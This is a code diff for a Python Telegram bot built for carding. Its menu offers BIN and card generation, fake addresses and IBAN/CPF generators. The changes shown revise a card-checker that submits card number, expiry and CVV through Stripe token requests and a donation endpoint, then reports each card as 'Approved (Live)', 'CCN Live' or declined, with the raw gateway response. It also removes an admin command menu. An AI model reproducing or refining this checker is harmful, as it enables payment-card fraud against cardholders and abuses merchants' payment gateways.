@@ -72,14 +72,6 @@ def setup_bot_commands():
     except Exception as e:
         print(f"Menu setup error: {e}")
 
-def check_cancel(message):
-    text = message.text
-    menu_buttons = ["🔐 Gen BIN", "💳 Check CC", "👉 Fake Address", "ℹ️ IBAN Gen", "©️ CPF Gen", "👤 My Info"]
-    if text in menu_buttons or text.startswith('/'):
-        handle_all_messages(message)
-        return True
-    return False
-
 # --- Dedicated /start Handler ---
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
@@ -134,18 +126,6 @@ def cmd_users_list(message):
     users_str = "\n".join([f"<code>{u}</code>" for u in display_users])
     bot.reply_to(message, f"👥 <b>Total Bot Users:</b> <code>{total}</code>\n\n{users_str}")
 
-@bot.message_handler(commands=['cmd', 'help'])
-def cmd_admin_menu(message):
-    if message.from_user.id != ADMIN_ID: return 
-    text = (
-        "🛠 <b>Admin Commands List</b>\n\n"
-        "👥 /users - Show All Users\n"
-        "🚫 /ban - Ban User\n"
-        "✅ /unban - Unban User\n"
-        "🛑 /banned - Banned List"
-    )
-    bot.reply_to(message, text, reply_markup=get_main_menu())
-
 # --- Direct Functions for Info & CPF ---
 def cmd_me(message):
     user = message.from_user
@@ -170,7 +150,7 @@ def cmd_cpf(message):
     )
     bot.reply_to(message, text, reply_markup=get_main_menu())
 
-# --- CC Checker & Binlist Logic ---
+# --- CC Checker & Binlist Logic (With Detailed Response Debugging) ---
 def check_bin(cc):
     bin_num = cc[:6]
     bin_data = {"banco": "Unknown", "pais": "Unknown", "nivel": "Unknown", "type": "Unknown"}
@@ -202,6 +182,10 @@ def check_card(cc, mes, ano, cvv):
         req_token = requests.post(token_url, headers=token_headers, data=token_payload, timeout=10)
         token_res = req_token.text
         
+        # Check if Token generation failed (e.g. Invalid Key)
+        if "error" in token_res.lower():
+            return f"⚠️ <b>Stripe Key Error / Dead Key:</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Raw:</b> <code>{token_res[:100]}</code>\n<b>By:</b> @Ren2512"
+
         token = ""
         if '"id": "' in token_res:
             token = token_res.split('"id": "')[1].split('"')[0]
@@ -216,19 +200,16 @@ def check_card(cc, mes, ano, cvv):
         req_charge = requests.post(donate_url, headers=donate_headers, data=donate_payload, timeout=10)
         charge_res = req_charge.text
 
-        if "Your card's security code is incorrect." in charge_res or "Your card's security code is incorrect." in token_res:
+        # Success / Approved criteria
+        if any(x in charge_res.lower() for x in ["success", "thank", "approved", "completed", "charge"]):
             return f"🟢 <b>#Approved (Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
-        elif "incorrect_number" in token_res or "Your card number is incorrect." in charge_res:
-            return f"🔴 <b>#Declined (Invalid)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
-        elif "Your card does not support this type of purchase." in token_res or "Your card does not support this type of purchase." in charge_res:
-            return f"🔴 <b>#Declined (Blocked)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
-        elif "Your card was declined." in charge_res or "Your card was declined." in token_res:
-            return f"🔴 <b>#Declined (Dead)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
+        elif "Your card's security code is incorrect." in charge_res or "security code" in charge_res.lower():
+            return f"🟢 <b>#Approved (CCN Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
         else:
-            return f"🔴 <b>#Declined (Unknown)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
+            return f"🔴 <b>#Declined</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>Gate Res:</b> <code>{charge_res[:50]}</code>\n<b>By:</b> @Ren2512"
 
     except Exception as e:
-        return f"⚠️ <b>Error Check:</b> Timeout for {cc}"
+        return f"⚠️ <b>Error Check:</b> {e}"
 
 # --- Action Processors ---
 def generate_cc(message, input_text):
